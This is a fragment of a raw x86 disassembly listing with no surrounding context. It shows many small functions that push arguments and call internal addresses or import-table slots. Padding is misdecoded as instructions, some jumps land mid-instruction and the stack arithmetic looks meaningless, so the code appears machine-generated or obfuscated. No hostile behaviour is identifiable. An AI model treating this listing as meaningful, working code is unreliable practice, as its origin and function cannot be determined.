  4d1096:	or     ecx,DWORD PTR [esi-0x158]
  4d109c:	push   esi
  4d109d:	push   DWORD PTR [esi+0xc0]
  4d10a3:	push   DWORD PTR [esi+0x3c]
  4d10a6:	push   DWORD PTR [esi+0x28]
  4d10a9:	call   0x4d0b54
  4d10ae:	add    esp,0xc
  4d10b1:	pop    esi
  4d10b2:	push   0x0
  4d10b4:	call   0x4d1194
  4d10b9:	add    esp,0x4
  4d10bc:	call   0x4d0ea8
  4d10c1:	add    esp,0x4
  4d10c4:	add    esp,0x20
  4d10c7:	pop    ebp
  4d10c8:	ret    
  4d10c9:	add    BYTE PTR [eax],al
  4d10cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10d1:	sub    esp,0x38
  4d10d4:	mov    edx,0x4d311c
  4d10d9:	sub    DWORD PTR [ebp-0xc],edx
  4d10dc:	push   edx
  4d10dd:	push   esi
  4d10de:	push   DWORD PTR [edx+0x138]
  4d10e4:	push   DWORD PTR [edx+0x130]
  4d10ea:	call   0x4d0790
  4d10ef:	add    esp,0xc
  4d10f2:	pop    edx
  4d10f3:	push   edx
  4d10f4:	mov    edi,0x0
  4d10f9:	push   edi
  4d10fa:	call   0x4d1410
  4d10ff:	add    esp,0x4
  4d1102:	pop    edx
  4d1103:	push   edx
  4d1104:	call   0x4d0ea8
  4d1109:	add    esp,0x4
  4d110c:	pop    edx
  4d110d:	add    esp,0x38
  4d1110:	pop    ebp
  4d1111:	ret    
  4d1112:	add    BYTE PTR [eax],al
  4d1114:	pop    edi
  4d1115:	call   DWORD PTR ds:0x4d2000
  4d111b:	call   edi
  4d111d:	add    BYTE PTR [eax],al
  4d111f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1125:	sub    esp,0x34
  4d1128:	mov    edi,0x4d304c
  4d112d:	or     DWORD PTR [ebp-0x34],edx
  4d1130:	push   edi
  4d1131:	call   0x4d0d18
  4d1136:	add    esp,0x4
  4d1139:	pop    edi
  4d113a:	push   edi
  4d113b:	push   ebx
  4d113c:	push   DWORD PTR [edi+0x8]
  4d113f:	push   DWORD PTR [edi+0x1a0]
  4d1145:	push   DWORD PTR [edi+0x38]
  4d1148:	call   0x4d13b8
  4d114d:	add    esp,0x10
  4d1150:	pop    edi
  4d1151:	push   edi
  4d1152:	push   0x0
  4d1154:	call   0x4d1188
  4d1159:	add    esp,0x4
  4d115c:	pop    edi
  4d115d:	add    esp,0x34
  4d1160:	pop    ebp
  4d1161:	ret    
  4d1162:	add    BYTE PTR [eax],al
  4d1164:	pop    edi
  4d1165:	call   DWORD PTR ds:0x4d2060
  4d116b:	call   edi
  4d116d:	add    BYTE PTR [eax],al
  4d116f:	add    BYTE PTR [edi-0x1],bl
  4d1172:	adc    eax,0x4d2090
  4d1177:	call   edi
  4d1179:	add    BYTE PTR [eax],al
  4d117b:	add    BYTE PTR [edi-0x1],bl
  4d117e:	adc    eax,0x4d206c
  4d1183:	call   edi
  4d1185:	add    BYTE PTR [eax],al
  4d1187:	add    BYTE PTR [edi-0x1],bl
  4d118a:	adc    eax,0x4d2054
  4d118f:	call   edi
  4d1191:	add    BYTE PTR [eax],al
  4d1193:	add    BYTE PTR [edi-0x1],bl
  4d1196:	adc    eax,0x4d204c
  4d119b:	call   edi
  4d119d:	add    BYTE PTR [eax],al
  4d119f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11a5:	sub    esp,0x44
  4d11a8:	lea    ebx,[ecx+0xc]
  4d11ab:	and    DWORD PTR [ebp-0x20],0x40
  4d11af:	call   0x4d103c
  4d11b4:	add    esp,0x4
  4d11b7:	push   ebx
  4d11b8:	push   DWORD PTR [ebx+0xc8]
  4d11be:	push   DWORD PTR [ebx+0x14c]
  4d11c4:	push   edi
  4d11c5:	push   DWORD PTR [ebx+0xa4]
  4d11cb:	call   0x4d0e04
  4d11d0:	add    esp,0x10
  4d11d3:	pop    ebx
  4d11d4:	mov    ecx,0x0
  4d11d9:	push   ecx
  4d11da:	call   0x4d1484
  4d11df:	add    esp,0x4
  4d11e2:	add    esp,0x44
  4d11e5:	pop    ebp
  4d11e6:	ret    
  4d11e7:	add    BYTE PTR [edi-0x1],bl
  4d11ea:	adc    eax,0x4d2074
  4d11ef:	call   edi
  4d11f1:	add    BYTE PTR [eax],al
  4d11f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11f9:	sub    esp,0x3c
  4d11fc:	lea    eax,[esi+0x7c]
  4d11ff:	sbb    esi,DWORD PTR [ebp-0x38]
  4d1202:	push   eax
  4d1203:	push   DWORD PTR [eax+0x7c]
  4d1206:	push   DWORD PTR [eax+0x68]
  4d1209:	push   edi
  4d120a:	push   DWORD PTR [eax+0x8c]
  4d1210:	call   0x4d0998
  4d1215:	add    esp,0x10
  4d1218:	pop    eax
  4d1219:	push   eax
  4d121a:	push   0x0
  4d121c:	call   0x4d1188
  4d1221:	add    esp,0x4
  4d1224:	pop    eax
  4d1225:	push   eax
  4d1226:	call   0x4d0d18
  4d122b:	add    esp,0x4
  4d122e:	pop    eax
  4d122f:	add    esp,0x3c
  4d1232:	pop    ebp
  4d1233:	ret    
  4d1234:	mov    edi,edi
  4d1236:	push   ebp
  4d1237:	mov    ebp,esp
  4d1239:	sub    esp,0x4c
  4d123c:	lea    ecx,[edi-0x5c]
  4d123f:	sub    DWORD PTR [ecx+0x1d4],ecx
  4d1245:	push   ecx
  4d1246:	call   0x4d0d18
  4d124b:	add    esp,0x4
  4d124e:	pop    ecx
  4d124f:	push   ecx
  4d1250:	push   DWORD PTR [ecx+0xd8]
  4d1256:	push   ebx
  4d1257:	push   ebx
  4d1258:	push   edx
  4d1259:	call   0x4d0b98
  4d125e:	add    esp,0x10
  4d1261:	pop    ecx
  4d1262:	push   ecx
  4d1263:	mov    edi,0x0
  4d1268:	push   edi
  4d1269:	call   0x4d0df8
  4d126e:	add    esp,0x4
  4d1271:	pop    ecx
  4d1272:	add    esp,0x4c
  4d1275:	pop    ebp
  4d1276:	ret    
  4d1277:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d127d:	sub    esp,0x48
  4d1280:	mov    edi,0x4d30a4
  4d1285:	or     ebx,0xffff9c86
  4d128b:	push   edi
  4d128c:	push   DWORD PTR [edi+0x1bc]
  4d1292:	push   DWORD PTR [edi+0x150]
  4d1298:	push   DWORD PTR [edi+0x118]
  4d129e:	push   DWORD PTR [edi+0x50]
  4d12a1:	call   0x4d06ec
  4d12a6:	add    esp,0x10
  4d12a9:	pop    edi
  4d12aa:	push   edi
  4d12ab:	mov    edx,0x0
  4d12b0:	push   edx
  4d12b1:	call   0x4d1188
  4d12b6:	add    esp,0x4
  4d12b9:	pop    edi
  4d12ba:	push   edi
  4d12bb:	mov    ecx,0x0
  4d12c0:	push   ecx
  4d12c1:	call   0x4d1484
  4d12c6:	add    esp,0x4
  4d12c9:	pop    edi
  4d12ca:	add    esp,0x48
  4d12cd:	pop    ebp
  4d12ce:	ret    
  4d12cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12d5:	sub    esp,0x24
  4d12d8:	lea    ecx,ds:0x4d3154
  4d12de:	cmp    ecx,0xc1c
  4d12e4:	jb     0x4d12d3
  4d12e6:	push   ecx
  4d12e7:	mov    eax,0xfffffff4
  4d12ec:	push   eax
  4d12ed:	call   0x4d0e48
  4d12f2:	add    esp,0x4
  4d12f5:	pop    ecx
  4d12f6:	push   ecx
  4d12f7:	push   DWORD PTR [ecx+0x178]
  4d12fd:	push   DWORD PTR [ecx+0x94]
  4d1303:	push   ebx
  4d1304:	call   0x4d08c0
  4d1309:	add    esp,0xc
  4d130c:	pop    ecx
  4d130d:	push   ecx
  4d130e:	mov    ecx,0x0
  4d1313:	push   ecx
  4d1314:	call   0x4d1164
  4d1319:	add    esp,0x4
  4d131c:	pop    ecx
  4d131d:	add    esp,0x24
  4d1320:	pop    ebp
  4d1321:	ret    
  4d1322:	add    BYTE PTR [eax],al
  4d1324:	mov    edi,edi
  4d1326:	push   ebp
  4d1327:	mov    ebp,esp
  4d1329:	sub    esp,0x40
  4d132c:	mov    ecx,0x4d3178
  4d1331:	cmp    ecx,0x3a42
  4d1337:	je     0x4d1327
  4d1339:	push   ecx
  4d133a:	push   0x0
  4d133c:	call   0x4d07d4
  4d1341:	add    esp,0x4
  4d1344:	pop    ecx
  4d1345:	push   ecx
  4d1346:	push   eax
  4d1347:	push   edi
  4d1348:	push   eax
  4d1349:	call   0x4d0ffc
  4d134e:	add    esp,0xc
  4d1351:	pop    ecx
  4d1352:	push   ecx
  4d1353:	call   0x4d0d18
  4d1358:	add    esp,0x4
  4d135b:	pop    ecx
  4d135c:	add    esp,0x40
  4d135f:	pop    ebp
  4d1360:	ret    
  4d1361:	add    BYTE PTR [eax],al
  4d1363:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1369:	sub    esp,0x58
  4d136c:	lea    esi,[ebx+0x30]
  4d136f:	and    DWORD PTR [esi+0xf0],0xfffffab4
  4d1379:	push   0x0
  4d137b:	call   0x4d07d4
  4d1380:	add    esp,0x4
  4d1383:	push   esi
  4d1384:	push   DWORD PTR [esi+0x124]
  4d138a:	push   DWORD PTR [esi+0x50]
  4d138d:	push   DWORD PTR [esi+0x190]
  4d1393:	call   0x4d0eb4
  4d1398:	add    esp,0xc
  4d139b:	pop    esi
  4d139c:	push   0xfffffff4
  4d139e:	call   0x4d0e48
  4d13a3:	add    esp,0x4
  4d13a6:	add    esp,0x58
  4d13a9:	pop    ebp
  4d13aa:	ret    
  4d13ab:	add    BYTE PTR [edi-0x1],bl
  4d13ae:	adc    eax,0x4d2068
  4d13b3:	call   edi
  4d13b5:	add    BYTE PTR [eax],al
  4d13b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13bd:	sub    esp,0x44
  4d13c0:	mov    edx,0x4d31b4
  4d13c5:	xor    ecx,0x41
  4d13c8:	push   edx
  4d13c9:	mov    edx,0x0
  4d13ce:	push   edx
  4d13cf:	call   0x4d1194
  4d13d4:	add    esp,0x4
  4d13d7:	pop    edx
  4d13d8:	push   edx
  4d13d9:	push   DWORD PTR [edx+0x154]
  4d13df:	push   DWORD PTR [edx+0x174]
  4d13e5:	push   DWORD PTR [edx+0x134]
  4d13eb:	push   DWORD PTR [edx+0x98]
  4d13f1:	call   0x4d1088
  4d13f6:	add    esp,0x10
  4d13f9:	pop    edx
  4d13fa:	push   edx
  4d13fb:	mov    eax,0x0
  4d1400:	push   eax
  4d1401:	call   0x4d1410
  4d1406:	add    esp,0x4
  4d1409:	pop    edx
  4d140a:	add    esp,0x44
  4d140d:	pop    ebp
  4d140e:	ret    
  4d140f:	add    BYTE PTR [edi-0x1],bl
  4d1412:	adc    eax,0x4d2014
  4d1417:	call   edi
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [edi-0x1],bl
  4d141e:	adc    eax,0x4d2034
  4d1423:	call   edi
  4d1425:	add    BYTE PTR [eax],al
  4d1427:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d142d:	sub    esp,0x34
  4d1430:	lea    edi,[eax-0x8c]
  4d1436:	adc    ecx,DWORD PTR [edi+0x3c]
  4d1439:	push   edi
  4d143a:	push   edx
  4d143b:	push   DWORD PTR [edi+0x1fc]
  4d1441:	call   0x4d0c7c
  4d1446:	add    esp,0x8
  4d1449:	pop    edi
  4d144a:	push   edi
  4d144b:	mov    esi,0x0
  4d1450:	push   esi
  4d1451:	call   0x4d089c
  4d1456:	add    esp,0x4
  4d1459:	pop    edi
  4d145a:	push   edi
  4d145b:	push   0x0
  4d145d:	call   0x4d1188
  4d1462:	add    esp,0x4
  4d1465:	pop    edi
  4d1466:	add    esp,0x34
  4d1469:	pop    ebp
  4d146a:	ret    
  4d146b:	add    BYTE PTR [edi-0x1],bl
  4d146e:	adc    eax,0x4d2098
  4d1473:	call   edi
  4d1475:	add    BYTE PTR [eax],al
  4d1477:	add    BYTE PTR [edi-0x1],bl
  4d147a:	adc    eax,0x4d207c
  4d147f:	call   edi
  4d1481:	add    BYTE PTR [eax],al
  4d1483:	add    BYTE PTR [edi-0x1],bl
  4d1486:	adc    eax,0x4d2004
  4d148b:	call   edi
  4d148d:	add    BYTE PTR [eax],al
  4d148f:	add    BYTE PTR [edi-0x1],bl
  4d1492:	adc    eax,0x4d205c
  4d1497:	call   edi
  4d1499:	add    BYTE PTR [eax],al
  4d149b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a1:	sub    esp,0x60
  4d14a4:	mov    esi,0x4d3060
  4d14a9:	mov    DWORD PTR [ebp-0x38],0x43
  4d14b0:	push   esi
  4d14b1:	push   DWORD PTR [esi+0xd4]
  4d14b7:	push   DWORD PTR [esi+0x198]
  4d14bd:	push   ecx
  4d14be:	call   0x4d11f4
  4d14c3:	add    esp,0xc
  4d14c6:	pop    esi
  4d14c7:	mov    edx,0x0
  4d14cc:	push   edx
  4d14cd:	call   0x4d089c
  4d14d2:	add    esp,0x4
  4d14d5:	push   0x0
  4d14d7:	call   0x4d1188
  4d14dc:	add    esp,0x4
  4d14df:	add    esp,0x60
  4d14e2:	pop    ebp
  4d14e3:	ret    
  4d14e4:	mov    edi,edi
  4d14e6:	push   ebp
  4d14e7:	mov    ebp,esp
  4d14e9:	sub    esp,0x60
  4d14ec:	mov    edi,0x4d30e4
  4d14f1:	mov    ecx,0xfffffff6
  4d14f6:	push   edi
  4d14f7:	push   DWORD PTR [edi+0x18c]
  4d14fd:	push   edx
  4d14fe:	call   0x4d0cd4
  4d1503:	add    esp,0x8
  4d1506:	pop    edi
  4d1507:	push   edi
  4d1508:	call   0x4d103c
  4d150d:	add    esp,0x4
  4d1510:	pop    edi
  4d1511:	push   edi
  4d1512:	mov    eax,0x0
  4d1517:	push   eax
  4d1518:	call   0x4d07d4
  4d151d:	add    esp,0x4
  4d1520:	pop    edi
  4d1521:	add    esp,0x60
  4d1524:	pop    ebp
  4d1525:	ret    
  4d1526:	add    BYTE PTR [eax],al
  4d1528:	mov    edi,edi
  4d152a:	push   ebp
  4d152b:	mov    ebp,esp
  4d152d:	sub    esp,0x58
  4d1530:	mov    esi,0x4d3094
  4d1535:	sbb    DWORD PTR [ebp-0xc],0x22af
  4d153c:	call   0x4d0ea8
  4d1541:	add    esp,0x4
  4d1544:	push   esi
  4d1545:	push   DWORD PTR [esi+0xb8]
  4d154b:	push   DWORD PTR [esi+0x1a4]
  4d1551:	call   0x4d0f6c
  4d1556:	add    esp,0x8
  4d1559:	pop    esi
  4d155a:	push   0x0
  4d155c:	call   0x4d1194
  4d1561:	add    esp,0x4
  4d1564:	add    esp,0x58
  4d1567:	pop    ebp
  4d1568:	ret    
  4d1569:	add    BYTE PTR [eax],al
  4d156b:	add    BYTE PTR [edi-0x1],bl
  4d156e:	adc    eax,0x4d2044
  4d1573:	call   edi
  4d1575:	add    BYTE PTR [eax],al
  4d1577:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d157d:	sub    esp,0x5c
  4d1580:	lea    esi,ds:0x4d310c
  4d1586:	and    DWORD PTR [esi-0x10],edi
  4d1589:	push   esi
  4d158a:	push   DWORD PTR [esi+0x64]
  4d158d:	push   ebx
  4d158e:	push   eax
  4d158f:	push   ebx
  4d1590:	call   0x4d1324
  4d1595:	add    esp,0x10
  4d1598:	pop    esi
  4d1599:	mov    ebx,0x0
  4d159e:	push   ebx
  4d159f:	call   0x4d089c
  4d15a4:	add    esp,0x4
  4d15a7:	mov    eax,0x0
  4d15ac:	push   eax
  4d15ad:	call   0x4d089c
  4d15b2:	add    esp,0x4
  4d15b5:	add    esp,0x5c
  4d15b8:	pop    ebp
  4d15b9:	ret    
  4d15ba:	add    BYTE PTR [eax],al
  4d15bc:	pop    edi
  4d15bd:	call   DWORD PTR ds:0x4d203c
  4d15c3:	call   edi
  4d15c5:	add    BYTE PTR [eax],al
	...
